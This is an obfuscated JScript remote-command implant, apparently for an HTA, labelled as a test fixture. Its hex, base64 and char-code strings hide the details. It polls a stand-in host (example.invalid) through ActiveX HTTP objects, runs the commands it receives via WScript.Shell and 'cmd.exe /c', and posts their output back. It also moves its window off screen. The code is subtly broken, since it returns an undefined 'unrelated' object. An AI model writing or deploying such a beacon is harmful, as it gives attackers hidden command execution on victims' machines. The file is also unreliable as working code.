// Reduced fixture retaining the complete HTTP command/response path.
function helperd(s){var B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";s=String(s).replace(/[^A-Za-z0-9+/=]/g,"");var o="",i=0,n=s.length;while(i<n){var c1=B.indexOf(s.charAt(i++)),c2=B.indexOf(s.charAt(i++)),c3=B.indexOf(s.charAt(i++)),c4=B.indexOf(s.charAt(i++));o+=String.fromCharCode((c1<<2)|(c2>>4));if(c3!==64)o+=String.fromCharCode(((c2&15)<<4)|(c3>>2));if(c4!==64)o+=String.fromCharCode(((c3&3)<<6)|c4);}return o;}
function helperc(a){var s="";for(var i=0;i<a.length;i++)s+=String.fromCharCode(a[i]);return s;}
var HOST="\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x69\x6e\x76\x61\x6c\x69\x64";
var HDR="\x78\x2d\x32\x66\x6a\x68\x6d\x36";
var SEC=helperd("Zml4dHVyZS10b2tlbg==");
var EP2=helperc([47,97,112,105,47,104,120,117,120,47,115,116,97,116,117,115,63,105,100,61]);
var EP3=helperd("L2FwaS9oeHV4L3JlcG9ydA==");
var ID="n"+Math.floor(Math.random()*1000000000).toString(36)+new Date().getTime().toString(36);
var K_ID="id";
var K_BEACON="beacon";
var K_OUT="output";
var K_CMD="cmd";
var helperbri89de=window[helperd("QWN0aXZlWE9iamVjdA==")];
var NP=[helperc([77,83,88,77,76,50,46,83,101,114,118,101,114,88,77,76,72,84,84,80]),helperc([77,105,99,114,111,115,111,102,116,46,88,77,76,72,84,84,80]),"\x57\x69\x6e\x48\x74\x74\x70\x2e\x57\x69\x6e\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x2e\x35\x2e\x31","\x4d\x53\x58\x4d\x4c\x32\x2e\x53\x65\x72\x76\x65\x72\x58\x4d\x4c\x48\x54\x54\x50\x2e\x36\x2e\x30"];
var S_WS=helperc([87,83,99,114,105,112,116,46,83,104,101,108,108]);
var S_CMD="\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20";
var S_CT="Content-Type";
function helperyarz(m,p,b){
  var ordem=[];
  for(var i=0;i<NP.length;i++){ if(NP[i].indexOf("WinHttp")!==-1) ordem.push(NP[i]); }
  for(var i=0;i<NP.length;i++){ if(NP[i].indexOf("WinHttp")===-1) ordem.push(NP[i]); }

  var cts=["application/json","text/plain;charset=UTF-8","application/octet-stream"];
  for(var helperi=0;helperi<ordem.length;helperi++){
    try{
      var r=new helperbri89de(ordem[helperi]);
      r.open(m,HOST+p,false);
      try{ r.setTimeouts(10000,10000,15000,30000); }catch(helpert){}
      try{ r.setOption(9, 0x0800); }catch(helpert){}
      r.setRequestHeader(HDR,SEC);
      if(b) r.setRequestHeader(S_CT,cts[Math.floor(Math.random()*cts.length)]);
      r.send(b||"");
      if(r.status!==200) continue;
      return unrelated.responseText;
    }catch(e){}
  }
  return null;
}
function helperf4pzl(){ return helperyarz("GET",EP2+encodeURIComponent(ID)); }
function helper8qmmy(cid,out){
  var e=String(out).replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\n/g,"\\n").replace(/\r/g,"");
  helperyarz("POST",EP3,'{"'+K_ID+'":"'+cid+'","'+K_BEACON+'":"'+ID+'","'+K_OUT+'":"'+e+'"}');
}
function helper0sfa2b(c){
  try{
    var sh = new helperbri89de(S_WS);
    var exec = sh.Exec(S_CMD + c);
    var out = exec.StdOut.ReadAll() + exec.StdErr.ReadAll();
    if(!out) return "-";
    return out;
  }catch(e){ return "erro: " + e.message; }
}
function helperyniay77(r){
  if(!r) return;
  var reI=new RegExp('"'+K_ID+'":"([^"]+)"');
  var reC=new RegExp('"'+K_CMD+'":"([^"]*)"');
  var mi=r.match(reI); var mc=r.match(reC);
  if(!mi || !mc || !mc[1]) return;
  var cid=mi[1]; var cmd=mc[1].replace(/\\"/g,'"').replace(/\\\\/g,"\\");
  
  var o = helper0sfa2b(cmd); 
  try{ helper8qmmy(cid,o); }catch(e){}
}
function helpereysdfd(k){try{if(k===1){helperyniay77(helperf4pzl());return;}}catch(e){}}
function tick(){helpereysdfd(1);setTimeout(tick,1000+Math.floor(Math.random()*1000));}
window.moveTo(-3000,-3000);
tick();
